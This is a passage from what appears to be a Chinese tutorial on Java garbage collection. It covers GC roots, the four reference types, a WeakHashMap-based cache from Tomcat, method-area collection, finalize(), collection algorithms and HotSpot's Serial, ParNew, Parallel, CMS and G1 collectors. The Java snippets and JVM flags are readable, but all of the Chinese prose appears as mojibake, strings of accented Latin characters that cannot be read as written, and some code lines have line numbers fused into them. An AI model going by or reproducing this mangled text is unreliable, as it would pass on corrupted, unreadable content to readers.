ˆä¸­å¼•ç”¨çš„å¯¹è±¡ æœ¬åœ°æ–¹æ³•æ ˆä¸­å¼•ç”¨çš„å¯¹è±¡ æ–¹æ³•åŒºä¸­ç±»é™æ€å±æ€§å¼•ç”¨çš„å¯¹è±¡ æ–¹æ³•åŒºä¸­çš„å¸¸é‡å¼•ç”¨çš„å¯¹è±¡ 3. å¼•ç”¨ç±»å‹æ— è®ºæ˜¯é€šè¿‡å¼•ç”¨è®¡ç®—ç®—æ³•åˆ¤æ–­å¯¹è±¡çš„å¼•ç”¨æ•°é‡ï¼Œè¿˜æ˜¯é€šè¿‡å¯è¾¾æ€§åˆ†æç®—æ³•åˆ¤æ–­å¯¹è±¡æ˜¯å¦å¯è¾¾ï¼Œåˆ¤å®šå¯¹è±¡æ˜¯å¦å¯è¢«å›æ”¶éƒ½ä¸å¼•ç”¨æœ‰å…³ã€‚ Java å…·æœ‰å››ç§å¼ºåº¦ä¸åŒçš„å¼•ç”¨ç±»å‹ã€‚ ï¼ˆä¸€ï¼‰å¼ºå¼•ç”¨ è¢«å¼ºå¼•ç”¨å…³è”çš„å¯¹è±¡ä¸ä¼šè¢«åƒåœ¾æ”¶é›†å™¨å›æ”¶ã€‚ ä½¿ç”¨ new ä¸€ä¸ªæ–°å¯¹è±¡çš„æ–¹å¼æ¥åˆ›å»ºå¼ºå¼•ç”¨ã€‚ 1Object obj = new Object(); ï¼ˆäºŒï¼‰è½¯å¼•ç”¨ è¢«è½¯å¼•ç”¨å…³è”çš„å¯¹è±¡ï¼Œåªæœ‰åœ¨å†…å­˜ä¸å¤Ÿçš„æƒ…å†µä¸‹æ‰ä¼šè¢«å›æ”¶ã€‚ ä½¿ç”¨ SoftReference ç±»æ¥åˆ›å»ºè½¯å¼•ç”¨ã€‚ 123Object obj = new Object();SoftReference&lt;Object&gt; sf = new SoftReference&lt;Object&gt;(obj);obj = null; // ä½¿å¯¹è±¡åªè¢«è½¯å¼•ç”¨å…³è” ï¼ˆä¸‰ï¼‰å¼±å¼•ç”¨ è¢«å¼±å¼•ç”¨å…³è”çš„å¯¹è±¡ä¸€å®šä¼šè¢«åƒåœ¾æ”¶é›†å™¨å›æ”¶ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒåªèƒ½å­˜æ´»åˆ°ä¸‹ä¸€æ¬¡åƒåœ¾æ”¶é›†å‘ç”Ÿä¹‹å‰ã€‚ ä½¿ç”¨ WeakReference ç±»æ¥å®ç°å¼±å¼•ç”¨ã€‚ 123Object obj = new Object();WeakReference&lt;Object&gt; wf = new WeakReference&lt;Object&gt;(obj);obj = null; WeakHashMap çš„ Entry ç»§æ‰¿è‡ª WeakReferenceï¼Œä¸»è¦ç”¨æ¥å®ç°ç¼“å­˜ã€‚ 1private static class Entry&lt;K,V&gt; extends WeakReference&lt;Object&gt; implements Map.Entry&lt;K,V&gt; Tomcat ä¸­çš„ ConcurrentCache å°±ä½¿ç”¨äº† WeakHashMap æ¥å®ç°ç¼“å­˜åŠŸèƒ½ã€‚ConcurrentCache é‡‡å–çš„æ˜¯åˆ†ä»£ç¼“å­˜ï¼Œç»å¸¸ä½¿ç”¨çš„å¯¹è±¡æ”¾å…¥ eden ä¸­ï¼Œè€Œä¸å¸¸ç”¨çš„å¯¹è±¡æ”¾å…¥ longtermã€‚eden ä½¿ç”¨ ConcurrentHashMap å®ç°ï¼Œlongterm ä½¿ç”¨ WeakHashMapï¼Œä¿è¯äº†ä¸å¸¸ä½¿ç”¨çš„å¯¹è±¡å®¹æ˜“è¢«å›æ”¶ã€‚ 1234567891011121314151617181920212223242526272829303132public final class ConcurrentCache&lt;K, V&gt; &#123; private final int size; private final Map&lt;K, V&gt; eden; private final Map&lt;K, V&gt; longterm; public ConcurrentCache(int size) &#123; this.size = size; this.eden = new ConcurrentHashMap&lt;&gt;(size); this.longterm = new WeakHashMap&lt;&gt;(size); &#125; public V get(K k) &#123; V v = this.eden.get(k); if (v == null) &#123; v = this.longterm.get(k); if (v != null) this.eden.put(k, v); &#125; return v; &#125; public void put(K k, V v) &#123; if (this.eden.size() &gt;= size) &#123; this.longterm.putAll(this.eden); this.eden.clear(); &#125; this.eden.put(k, v); &#125;&#125; ï¼ˆå››ï¼‰è™šå¼•ç”¨ åˆç§°ä¸ºå¹½çµå¼•ç”¨æˆ–è€…å¹»å½±å¼•ç”¨ã€‚ä¸€ä¸ªå¯¹è±¡æ˜¯å¦æœ‰è™šå¼•ç”¨çš„å­˜åœ¨ï¼Œå®Œå…¨ä¸ä¼šå¯¹å…¶ç”Ÿå­˜æ—¶é—´æ„æˆå½±å“ï¼Œä¹Ÿæ— æ³•é€šè¿‡è™šå¼•ç”¨å–å¾—ä¸€ä¸ªå¯¹è±¡å®ä¾‹ã€‚ ä¸ºä¸€ä¸ªå¯¹è±¡è®¾ç½®è™šå¼•ç”¨å…³è”çš„å”¯ä¸€ç›®çš„å°±æ˜¯èƒ½åœ¨è¿™ä¸ªå¯¹è±¡è¢«æ”¶é›†å™¨å›æ”¶æ—¶æ”¶åˆ°ä¸€ä¸ªç³»ç»Ÿé€šçŸ¥ã€‚ ä½¿ç”¨ PhantomReference æ¥å®ç°è™šå¼•ç”¨ã€‚ 123Object obj = new Object();PhantomReference&lt;Object&gt; pf = new PhantomReference&lt;Object&gt;(obj);obj = null; 4. æ–¹æ³•åŒºçš„å›æ”¶å› ä¸ºæ–¹æ³•åŒºä¸»è¦å­˜æ”¾æ°¸ä¹…ä»£å¯¹è±¡ï¼Œè€Œæ°¸ä¹…ä»£å¯¹è±¡çš„å›æ”¶ç‡æ¯”æ–°ç”Ÿä»£å·®å¾ˆå¤šï¼Œå› æ­¤åœ¨æ–¹æ³•åŒºä¸Šè¿›è¡Œå›æ”¶æ€§ä»·æ¯”ä¸é«˜ã€‚ ä¸»è¦æ˜¯å¯¹å¸¸é‡æ± çš„å›æ”¶å’Œå¯¹ç±»çš„å¸è½½ã€‚ ç±»çš„å¸è½½æ¡ä»¶å¾ˆå¤šï¼Œéœ€è¦æ»¡è¶³ä»¥ä¸‹ä¸‰ä¸ªæ¡ä»¶ï¼Œå¹¶ä¸”æ»¡è¶³äº†ä¹Ÿä¸ä¸€å®šä¼šè¢«å¸è½½ï¼š è¯¥ç±»æ‰€æœ‰çš„å®ä¾‹éƒ½å·²ç»è¢«å›æ”¶ï¼Œä¹Ÿå°±æ˜¯ Java å †ä¸­ä¸å­˜åœ¨è¯¥ç±»çš„ä»»ä½•å®ä¾‹ã€‚ åŠ è½½è¯¥ç±»çš„ ClassLoader å·²ç»è¢«å›æ”¶ã€‚ è¯¥ç±»å¯¹åº”çš„ java.lang.Class å¯¹è±¡æ²¡æœ‰åœ¨ä»»ä½•åœ°æ–¹è¢«å¼•ç”¨ï¼Œä¹Ÿå°±æ— æ³•åœ¨ä»»ä½•åœ°æ–¹é€šè¿‡åå°„è®¿é—®è¯¥ç±»æ–¹æ³•ã€‚ å¯ä»¥é€šè¿‡ -Xnoclassgc å‚æ•°æ¥æ§åˆ¶æ˜¯å¦å¯¹ç±»è¿›è¡Œå¸è½½ã€‚ åœ¨å¤§é‡ä½¿ç”¨åå°„ã€åŠ¨æ€ä»£ç†ã€CGLib ç­‰ ByteCode æ¡†æ¶ã€åŠ¨æ€ç”Ÿæˆ JSP ä»¥åŠ OSGi è¿™ç±»é¢‘ç¹è‡ªå®šä¹‰ ClassLoader çš„åœºæ™¯éƒ½éœ€è¦è™šæ‹Ÿæœºå…·å¤‡ç±»å¸è½½åŠŸèƒ½ï¼Œä»¥ä¿è¯ä¸ä¼šå‡ºç°å†…å­˜æº¢å‡ºã€‚ 5. finalize()finalize() ç±»ä¼¼ C++ çš„ææ„å‡½æ•°ï¼Œç”¨æ¥åšå…³é—­å¤–éƒ¨èµ„æºç­‰å·¥ä½œã€‚ä½†æ˜¯ try-finally ç­‰æ–¹å¼å¯ä»¥åšçš„æ›´å¥½ï¼Œå¹¶ä¸”è¯¥æ–¹æ³•è¿è¡Œä»£ä»·é«˜æ˜‚ï¼Œä¸ç¡®å®šæ€§å¤§ï¼Œæ— æ³•ä¿è¯å„ä¸ªå¯¹è±¡çš„è°ƒç”¨é¡ºåºï¼Œå› æ­¤æœ€å¥½ä¸è¦ä½¿ç”¨ã€‚ å½“ä¸€ä¸ªå¯¹è±¡å¯è¢«å›æ”¶æ—¶ï¼Œå¦‚æœéœ€è¦æ‰§è¡Œè¯¥å¯¹è±¡çš„ finalize() æ–¹æ³•ï¼Œé‚£ä¹ˆå°±æœ‰å¯èƒ½é€šè¿‡åœ¨è¯¥æ–¹æ³•ä¸­è®©å¯¹è±¡é‡æ–°è¢«å¼•ç”¨ï¼Œä»è€Œå®ç°è‡ªæ•‘ã€‚è‡ªæ•‘åªèƒ½è¿›è¡Œä¸€æ¬¡ï¼Œå¦‚æœå›æ”¶çš„å¯¹è±¡ä¹‹å‰è°ƒç”¨äº† finalize() æ–¹æ³•è‡ªæ•‘ï¼Œåé¢å›æ”¶æ—¶ä¸ä¼šè°ƒç”¨ finalize() æ–¹æ³•ã€‚ åƒåœ¾æ”¶é›†ç®—æ³•1. æ ‡è®° - æ¸…é™¤ å°†å­˜æ´»çš„å¯¹è±¡è¿›è¡Œæ ‡è®°ï¼Œç„¶åæ¸…ç†æ‰æœªè¢«æ ‡è®°çš„å¯¹è±¡ã€‚ ä¸è¶³ï¼š æ ‡è®°å’Œæ¸…é™¤è¿‡ç¨‹æ•ˆç‡éƒ½ä¸é«˜ï¼› ä¼šäº§ç”Ÿå¤§é‡ä¸è¿ç»­çš„å†…å­˜ç¢ç‰‡ï¼Œå¯¼è‡´æ— æ³•ç»™å¤§å¯¹è±¡åˆ†é…å†…å­˜ã€‚ 2. æ ‡è®° - æ•´ç† è®©æ‰€æœ‰å­˜æ´»çš„å¯¹è±¡éƒ½å‘ä¸€ç«¯ç§»åŠ¨ï¼Œç„¶åç›´æ¥æ¸…ç†æ‰ç«¯è¾¹ç•Œä»¥å¤–çš„å†…å­˜ã€‚ 3. å¤åˆ¶ å°†å†…å­˜åˆ’åˆ†ä¸ºå¤§å°ç›¸ç­‰çš„ä¸¤å—ï¼Œæ¯æ¬¡åªä½¿ç”¨å…¶ä¸­ä¸€å—ï¼Œå½“è¿™ä¸€å—å†…å­˜ç”¨å®Œäº†å°±å°†è¿˜å­˜æ´»çš„å¯¹è±¡å¤åˆ¶åˆ°å¦ä¸€å—ä¸Šé¢ï¼Œç„¶åå†æŠŠä½¿ç”¨è¿‡çš„å†…å­˜ç©ºé—´è¿›è¡Œä¸€æ¬¡æ¸…ç†ã€‚ ä¸»è¦ä¸è¶³æ˜¯åªä½¿ç”¨äº†å†…å­˜çš„ä¸€åŠã€‚ ç°åœ¨çš„å•†ä¸šè™šæ‹Ÿæœºéƒ½é‡‡ç”¨è¿™ç§æ”¶é›†ç®—æ³•æ¥å›æ”¶æ–°ç”Ÿä»£ï¼Œä½†æ˜¯å¹¶ä¸æ˜¯å°†å†…å­˜åˆ’åˆ†ä¸ºå¤§å°ç›¸ç­‰çš„ä¸¤å—ï¼Œè€Œæ˜¯åˆ†ä¸ºä¸€å—è¾ƒå¤§çš„ Eden ç©ºé—´å’Œä¸¤å—è¾ƒå°çš„ Survivor ç©ºé—´ï¼Œæ¯æ¬¡ä½¿ç”¨ Eden ç©ºé—´å’Œå…¶ä¸­ä¸€å— Survivorã€‚åœ¨å›æ”¶æ—¶ï¼Œå°† Eden å’Œ Survivor ä¸­è¿˜å­˜æ´»ç€çš„å¯¹è±¡ä¸€æ¬¡æ€§å¤åˆ¶åˆ°å¦ä¸€å— Survivor ç©ºé—´ä¸Šï¼Œæœ€åæ¸…ç† Eden å’Œä½¿ç”¨è¿‡çš„é‚£ä¸€å— Survivorã€‚HotSpot è™šæ‹Ÿæœºçš„ Eden å’Œ Survivor çš„å¤§å°æ¯”ä¾‹é»˜è®¤ä¸º 8:1ï¼Œä¿è¯äº†å†…å­˜çš„åˆ©ç”¨ç‡è¾¾åˆ° 90%ã€‚å¦‚æœæ¯æ¬¡å›æ”¶æœ‰å¤šäº 10% çš„å¯¹è±¡å­˜æ´»ï¼Œé‚£ä¹ˆä¸€å— Survivor ç©ºé—´å°±ä¸å¤Ÿç”¨äº†ï¼Œæ­¤æ—¶éœ€è¦ä¾èµ–äºè€å¹´ä»£è¿›è¡Œåˆ†é…æ‹…ä¿ï¼Œä¹Ÿå°±æ˜¯å€Ÿç”¨è€å¹´ä»£çš„ç©ºé—´å­˜å‚¨æ”¾ä¸ä¸‹çš„å¯¹è±¡ã€‚ 4. åˆ†ä»£æ”¶é›†ç°åœ¨çš„å•†ä¸šè™šæ‹Ÿæœºé‡‡ç”¨åˆ†ä»£æ”¶é›†ç®—æ³•ï¼Œå®ƒæ ¹æ®å¯¹è±¡å­˜æ´»å‘¨æœŸå°†å†…å­˜åˆ’åˆ†ä¸ºå‡ å—ï¼Œä¸åŒå—é‡‡ç”¨é€‚å½“çš„æ”¶é›†ç®—æ³•ã€‚ ä¸€èˆ¬å°† Java å †åˆ†ä¸ºæ–°ç”Ÿä»£å’Œè€å¹´ä»£ã€‚ æ–°ç”Ÿä»£ä½¿ç”¨ï¼šå¤åˆ¶ç®—æ³• è€å¹´ä»£ä½¿ç”¨ï¼šæ ‡è®° - æ¸…ç† æˆ–è€… æ ‡è®° - æ•´ç† ç®—æ³• åƒåœ¾æ”¶é›†å™¨ ä»¥ä¸Šæ˜¯ HotSpot è™šæ‹Ÿæœºä¸­çš„ 7 ä¸ªåƒåœ¾æ”¶é›†å™¨ï¼Œè¿çº¿è¡¨ç¤ºåƒåœ¾æ”¶é›†å™¨å¯ä»¥é…åˆä½¿ç”¨ã€‚ å•çº¿ç¨‹ä¸å¹¶è¡Œï¼ˆå¤šçº¿ç¨‹ï¼‰ï¼šå•çº¿ç¨‹æŒ‡çš„æ˜¯åƒåœ¾æ”¶é›†å™¨åªä½¿ç”¨ä¸€ä¸ªçº¿ç¨‹è¿›è¡Œæ”¶é›†ï¼Œè€Œå¹¶è¡Œä½¿ç”¨å¤šä¸ªçº¿ç¨‹ã€‚ ä¸²è¡Œä¸å¹¶å‘ï¼šä¸²è¡ŒæŒ‡çš„æ˜¯åƒåœ¾æ”¶é›†å™¨ä¸ç”¨æˆ·ç¨‹åºäº¤æ›¿æ‰§è¡Œï¼Œè¿™æ„å‘³ç€åœ¨æ‰§è¡Œåƒåœ¾æ”¶é›†çš„æ—¶å€™éœ€è¦åœé¡¿ç”¨æˆ·ç¨‹åºï¼›å¹¶å‘æŒ‡çš„æ˜¯åƒåœ¾æ”¶é›†å™¨å’Œç”¨æˆ·ç¨‹åºåŒæ—¶æ‰§è¡Œã€‚é™¤äº† CMS å’Œ G1 ä¹‹å¤–ï¼Œå…¶å®ƒåƒåœ¾æ”¶é›†å™¨éƒ½æ˜¯ä»¥ä¸²è¡Œçš„æ–¹å¼æ‰§è¡Œã€‚ 1. Serial æ”¶é›†å™¨ Serial ç¿»è¯‘ä¸ºä¸²è¡Œï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒä»¥ä¸²è¡Œçš„æ–¹å¼æ‰§è¡Œã€‚ å®ƒæ˜¯å•çº¿ç¨‹çš„æ”¶é›†å™¨ï¼Œåªä¼šä½¿ç”¨ä¸€ä¸ªçº¿ç¨‹è¿›è¡Œåƒåœ¾æ”¶é›†å·¥ä½œã€‚ å®ƒçš„ä¼˜ç‚¹æ˜¯ç®€å•é«˜æ•ˆï¼Œå¯¹äºå•ä¸ª CPU ç¯å¢ƒæ¥è¯´ï¼Œç”±äºæ²¡æœ‰çº¿ç¨‹äº¤äº’çš„å¼€é”€ï¼Œå› æ­¤æ‹¥æœ‰æœ€é«˜çš„å•çº¿ç¨‹æ”¶é›†æ•ˆç‡ã€‚ å®ƒæ˜¯ Client æ¨¡å¼ä¸‹çš„é»˜è®¤æ–°ç”Ÿä»£æ”¶é›†å™¨ï¼Œå› ä¸ºåœ¨ç”¨æˆ·çš„æ¡Œé¢åº”ç”¨åœºæ™¯ä¸‹ï¼Œåˆ†é…ç»™è™šæ‹Ÿæœºç®¡ç†çš„å†…å­˜ä¸€èˆ¬æ¥è¯´ä¸ä¼šå¾ˆå¤§ã€‚Serial æ”¶é›†å™¨æ”¶é›†å‡ åå…†ç”šè‡³ä¸€ä¸¤ç™¾å…†çš„æ–°ç”Ÿä»£åœé¡¿æ—¶é—´å¯ä»¥æ§åˆ¶åœ¨ä¸€ç™¾å¤šæ¯«ç§’ä»¥å†…ï¼Œåªè¦ä¸æ˜¯å¤ªé¢‘ç¹ï¼Œè¿™ç‚¹åœé¡¿æ˜¯å¯ä»¥æ¥å—çš„ã€‚ 2. ParNew æ”¶é›†å™¨ å®ƒæ˜¯ Serial æ”¶é›†å™¨çš„å¤šçº¿ç¨‹ç‰ˆæœ¬ã€‚ æ˜¯ Server æ¨¡å¼ä¸‹çš„è™šæ‹Ÿæœºé¦–é€‰æ–°ç”Ÿä»£æ”¶é›†å™¨ï¼Œé™¤äº†æ€§èƒ½åŸå› å¤–ï¼Œä¸»è¦æ˜¯å› ä¸ºé™¤äº† Serial æ”¶é›†å™¨ï¼Œåªæœ‰å®ƒèƒ½ä¸ CMS æ”¶é›†å™¨é…åˆå·¥ä½œã€‚ é»˜è®¤å¼€å¯çš„çº¿ç¨‹æ•°é‡ä¸ CPU æ•°é‡ç›¸åŒï¼Œå¯ä»¥ä½¿ç”¨ -XX:ParallelGCThreads å‚æ•°æ¥è®¾ç½®çº¿ç¨‹æ•°ã€‚ 3. Parallel Scavenge æ”¶é›†å™¨ä¸ ParNew ä¸€æ ·æ˜¯å¹¶è¡Œçš„å¤šçº¿ç¨‹æ”¶é›†å™¨ã€‚ å…¶å®ƒæ”¶é›†å™¨å…³æ³¨ç‚¹æ˜¯å°½å¯èƒ½ç¼©çŸ­åƒåœ¾æ”¶é›†æ—¶ç”¨æˆ·çº¿ç¨‹çš„åœé¡¿æ—¶é—´ï¼Œè€Œå®ƒçš„ç›®æ ‡æ˜¯è¾¾åˆ°ä¸€ä¸ªå¯æ§åˆ¶çš„ååé‡ï¼Œå®ƒè¢«ç§°ä¸ºâ€œååé‡ä¼˜å…ˆâ€æ”¶é›†å™¨ã€‚è¿™é‡Œçš„ååé‡æŒ‡ CPU ç”¨äºè¿è¡Œç”¨æˆ·ä»£ç çš„æ—¶é—´å æ€»æ—¶é—´çš„æ¯”å€¼ã€‚ åœé¡¿æ—¶é—´è¶ŠçŸ­å°±è¶Šé€‚åˆéœ€è¦ä¸ç”¨æˆ·äº¤äº’çš„ç¨‹åºï¼Œè‰¯å¥½çš„å“åº”é€Ÿåº¦èƒ½æå‡ç”¨æˆ·ä½“éªŒã€‚è€Œé«˜ååé‡åˆ™å¯ä»¥é«˜æ•ˆç‡åœ°åˆ©ç”¨ CPU æ—¶é—´ï¼Œå°½å¿«å®Œæˆç¨‹åºçš„è¿ç®—ä»»åŠ¡ï¼Œä¸»è¦é€‚åˆåœ¨åå°è¿ç®—è€Œä¸éœ€è¦å¤ªå¤šäº¤äº’çš„ä»»åŠ¡ã€‚ æä¾›äº†ä¸¤ä¸ªå‚æ•°ç”¨äºç²¾ç¡®æ§åˆ¶ååé‡ï¼Œåˆ†åˆ«æ˜¯æ§åˆ¶æœ€å¤§åƒåœ¾æ”¶é›†åœé¡¿æ—¶é—´ -XX:MaxGCPauseMillis å‚æ•°ä»¥åŠç›´æ¥è®¾ç½®ååé‡å¤§å°çš„ -XX:GCTimeRatio å‚æ•°ï¼ˆå€¼ä¸ºå¤§äº 0 ä¸”å°äº 100 çš„æ•´æ•°ï¼‰ã€‚ç¼©çŸ­åœé¡¿æ—¶é—´æ˜¯ä»¥ç‰ºç‰²ååé‡å’Œæ–°ç”Ÿä»£ç©ºé—´æ¥æ¢å–çš„ï¼šæ–°ç”Ÿä»£ç©ºé—´å˜å°ï¼Œåƒåœ¾å›æ”¶å˜å¾—é¢‘ç¹ï¼Œå¯¼è‡´ååé‡ä¸‹é™ã€‚ è¿˜æä¾›äº†ä¸€ä¸ªå‚æ•° -XX:+UseAdaptiveSizePolicyï¼Œè¿™æ˜¯ä¸€ä¸ªå¼€å…³å‚æ•°ï¼Œæ‰“å¼€å‚æ•°åï¼Œå°±ä¸éœ€è¦æ‰‹å·¥æŒ‡å®šæ–°ç”Ÿä»£çš„å¤§å°ï¼ˆ-Xmnï¼‰ã€Eden å’Œ Survivor åŒºçš„æ¯”ä¾‹ï¼ˆ-XX:SurvivorRatioï¼‰ã€æ™‹å‡è€å¹´ä»£å¯¹è±¡å¹´é¾„ï¼ˆ-XX:PretenureSizeThresholdï¼‰ç­‰ç»†èŠ‚å‚æ•°äº†ï¼Œè™šæ‹Ÿæœºä¼šæ ¹æ®å½“å‰ç³»ç»Ÿçš„è¿è¡Œæƒ…å†µæ”¶é›†æ€§èƒ½ç›‘æ§ä¿¡æ¯ï¼ŒåŠ¨æ€è°ƒæ•´è¿™äº›å‚æ•°ä»¥æä¾›æœ€åˆé€‚çš„åœé¡¿æ—¶é—´æˆ–è€…æœ€å¤§çš„ååé‡ï¼Œè¿™ç§æ–¹å¼ç§°ä¸º GC è‡ªé€‚åº”çš„è°ƒèŠ‚ç­–ç•¥ï¼ˆGC Ergonomicsï¼‰ã€‚ 4. Serial Old æ”¶é›†å™¨ æ˜¯ Serial æ”¶é›†å™¨çš„è€å¹´ä»£ç‰ˆæœ¬ï¼Œä¹Ÿæ˜¯ç»™ Client æ¨¡å¼ä¸‹çš„è™šæ‹Ÿæœºä½¿ç”¨ã€‚å¦‚æœç”¨åœ¨ Server æ¨¡å¼ä¸‹ï¼Œå®ƒæœ‰ä¸¤å¤§ç”¨é€”ï¼š åœ¨ JDK 1.5 ä»¥åŠä¹‹å‰ç‰ˆæœ¬ï¼ˆParallel Old è¯ç”Ÿä»¥å‰ï¼‰ä¸­ä¸ Parallel Scavenge æ”¶é›†å™¨æ­é…ä½¿ç”¨ã€‚ ä½œä¸º CMS æ”¶é›†å™¨çš„åå¤‡é¢„æ¡ˆï¼Œåœ¨å¹¶å‘æ”¶é›†å‘ç”Ÿ Concurrent Mode Failure æ—¶ä½¿ç”¨ã€‚ 5. Parallel Old æ”¶é›†å™¨ æ˜¯ Parallel Scavenge æ”¶é›†å™¨çš„è€å¹´ä»£ç‰ˆæœ¬ã€‚ åœ¨æ³¨é‡ååé‡ä»¥åŠ CPU èµ„æºæ•æ„Ÿçš„åœºåˆï¼Œéƒ½å¯ä»¥ä¼˜å…ˆè€ƒè™‘ Parallel Scavenge åŠ  Parallel Old æ”¶é›†å™¨ã€‚ 6. CMS æ”¶é›†å™¨ CMSï¼ˆConcurrent Mark Sweepï¼‰ï¼ŒMark Sweep æŒ‡çš„æ˜¯æ ‡è®° - æ¸…é™¤ç®—æ³•ã€‚ ç‰¹ç‚¹ï¼šå¹¶å‘æ”¶é›†ã€ä½åœé¡¿ã€‚ åˆ†ä¸ºä»¥ä¸‹å››ä¸ªæµç¨‹ï¼š åˆå§‹æ ‡è®°ï¼šä»…ä»…åªæ˜¯æ ‡è®°ä¸€ä¸‹ GC Roots èƒ½ç›´æ¥å…³è”åˆ°çš„å¯¹è±¡ï¼Œé€Ÿåº¦å¾ˆå¿«ï¼Œéœ€è¦åœé¡¿ã€‚ å¹¶å‘æ ‡è®°ï¼šè¿›è¡Œ GC Roots Tracing çš„è¿‡ç¨‹ï¼Œå®ƒåœ¨æ•´ä¸ªå›æ”¶è¿‡ç¨‹ä¸­è€—æ—¶æœ€é•¿ï¼Œä¸éœ€è¦åœé¡¿ã€‚ é‡æ–°æ ‡è®°ï¼šä¸ºäº†ä¿®æ­£å¹¶å‘æ ‡è®°æœŸé—´å› ç”¨æˆ·ç¨‹åºç»§ç»­è¿ä½œè€Œå¯¼è‡´æ ‡è®°äº§ç”Ÿå˜åŠ¨çš„é‚£ä¸€éƒ¨åˆ†å¯¹è±¡çš„æ ‡è®°è®°å½•ï¼Œéœ€è¦åœé¡¿ã€‚ å¹¶å‘æ¸…é™¤ï¼šä¸éœ€è¦åœé¡¿ã€‚ åœ¨æ•´ä¸ªè¿‡ç¨‹ä¸­è€—æ—¶æœ€é•¿çš„å¹¶å‘æ ‡è®°å’Œå¹¶å‘æ¸…é™¤è¿‡ç¨‹ä¸­ï¼Œæ”¶é›†å™¨çº¿ç¨‹éƒ½å¯ä»¥ä¸ç”¨æˆ·çº¿ç¨‹ä¸€èµ·å·¥ä½œï¼Œä¸éœ€è¦è¿›è¡Œåœé¡¿ã€‚ å…·æœ‰ä»¥ä¸‹ç¼ºç‚¹ï¼š ååé‡ä½ï¼šä½åœé¡¿æ—¶é—´æ˜¯ä»¥ç‰ºç‰²ååé‡ä¸ºä»£ä»·çš„ï¼Œå¯¼è‡´ CPU åˆ©ç”¨ç‡ä¸å¤Ÿé«˜ã€‚ æ— æ³•å¤„ç†æµ®åŠ¨åƒåœ¾ï¼Œå¯èƒ½å‡ºç° Concurrent Mode Failureã€‚æµ®åŠ¨åƒåœ¾æ˜¯æŒ‡å¹¶å‘æ¸…é™¤é˜¶æ®µç”±äºç”¨æˆ·çº¿ç¨‹ç»§ç»­è¿è¡Œè€Œäº§ç”Ÿçš„åƒåœ¾ï¼Œè¿™éƒ¨åˆ†åƒåœ¾åªèƒ½åˆ°ä¸‹ä¸€æ¬¡ GC æ—¶æ‰èƒ½è¿›è¡Œå›æ”¶ã€‚ç”±äºæµ®åŠ¨åƒåœ¾çš„å­˜åœ¨ï¼Œå› æ­¤éœ€è¦é¢„ç•™å‡ºä¸€éƒ¨åˆ†å†…å­˜ï¼Œæ„å‘³ç€ CMS æ”¶é›†ä¸èƒ½åƒå…¶å®ƒæ”¶é›†å™¨é‚£æ ·ç­‰å¾…è€å¹´ä»£å¿«æ»¡çš„æ—¶å€™å†å›æ”¶ã€‚å¦‚æœé¢„ç•™çš„å†…å­˜ä¸å¤Ÿå­˜æ”¾æµ®åŠ¨åƒåœ¾ï¼Œå°±ä¼šå‡ºç° Concurrent Mode Failureï¼Œè¿™æ—¶è™šæ‹Ÿæœºå°†ä¸´æ—¶å¯ç”¨ Serial Old æ¥æ›¿ä»£ CMSã€‚ æ ‡è®° - æ¸…é™¤ç®—æ³•å¯¼è‡´çš„ç©ºé—´ç¢ç‰‡ï¼Œå¾€å¾€å‡ºç°è€å¹´ä»£ç©ºé—´å‰©ä½™ï¼Œä½†æ— æ³•æ‰¾åˆ°è¶³å¤Ÿå¤§è¿ç»­ç©ºé—´æ¥åˆ†é…å½“å‰å¯¹è±¡ï¼Œä¸å¾—ä¸æå‰è§¦å‘ä¸€æ¬¡ Full GCã€‚ 7. G1 æ”¶é›†å™¨G1ï¼ˆGarbage-Firstï¼‰ï¼Œå®ƒæ˜¯ä¸€æ¬¾é¢å‘æœåŠ¡ç«¯åº”ç”¨çš„åƒåœ¾æ”¶é›†å™¨ï¼Œåœ¨å¤š CPU å’Œå¤§å†…å­˜çš„åœºæ™¯ä¸‹æœ‰å¾ˆå¥½çš„æ€§èƒ½ã€‚HotSpot å¼€å‘å›¢é˜Ÿèµ‹äºˆå®ƒçš„ä½¿å‘½æ˜¯æœªæ¥å¯ä»¥æ›¿æ¢æ‰ CMS æ”¶é›†å™¨ã€‚ Java å †è¢«åˆ†ä¸ºæ–°ç”Ÿä»£ã€è€å¹´ä»£å’Œæ°¸ä¹…ä»£ï¼Œå…¶å®ƒæ”¶é›†å™¨è¿›è¡Œæ”¶é›†çš„èŒƒå›´éƒ½æ˜¯æ•´ä¸ªæ–°ç”Ÿä»£æˆ–è€…è€ç”Ÿä»£ï¼Œè€Œ G1 å¯ä»¥ç›´æ¥å¯¹æ–°ç”Ÿä»£å’Œæ°¸ä¹…ä»£ä¸€èµ·å›æ”¶ã€‚ G1 æŠŠå †åˆ’åˆ†æˆå¤šä¸ªå¤§å°ç›¸ç­‰çš„ç‹¬ç«‹åŒºåŸŸï¼ˆRegionï¼‰ï¼Œæ–°ç”Ÿä»£å’Œæ°¸ä¹…ä»£ä¸å†ç‰©ç†éš”ç¦»ã€‚ é€šè¿‡å¼•å…¥ Region çš„æ¦‚å¿µï¼Œä»è€Œå°†åŸæ¥çš„ä¸€æ•´å—å†…å­˜ç©ºé—´åˆ’åˆ†æˆå¤šä¸ªçš„å°ç©ºé—´ï¼Œä½¿å¾—æ¯ä¸ªå°ç©ºé—´å¯ä»¥å•ç‹¬è¿›è¡Œåƒåœ¾å›æ”¶ã€‚è¿™ç§åˆ’åˆ†æ–¹æ³•å¸¦æ¥äº†å¾ˆå¤§çš„çµæ´»æ€§ï¼Œä½¿å¾—å¯é¢„æµ‹çš„åœé¡¿æ—¶é—´æ¨¡å‹æˆä¸ºå¯èƒ½ã€‚é€šè¿‡è®°å½•æ¯ä¸ª Region åƒåœ¾å›æ”¶æ—¶é—´ä»¥åŠå›æ”¶æ‰€è·å¾—çš„ç©ºé—´ï¼ˆè¿™ä¸¤ä¸ªå€¼æ˜¯é€šè¿‡è¿‡å»å›æ”¶çš„ç»éªŒè·å¾—ï¼‰ï¼Œå¹¶ç»´æŠ¤ä¸€ä¸ªä¼˜å…ˆåˆ—è¡¨ï¼Œæ¯æ¬¡æ ¹æ®å…è®¸çš„æ”¶é›†æ—¶é—´ï¼Œä¼˜å…ˆå›æ”¶ä»·å€¼æœ€å¤§çš„ Regionã€‚ æ¯ä¸ª Region éƒ½æœ‰ä¸€ä¸ª Remembered Setï¼Œç”¨æ¥è®°å½•è¯¥ Region å¯¹è±¡çš„å¼•ç”¨å¯¹è±¡æ‰€åœ¨çš„ Regionã€‚é€šè¿‡ä½¿ç”¨ Remembered 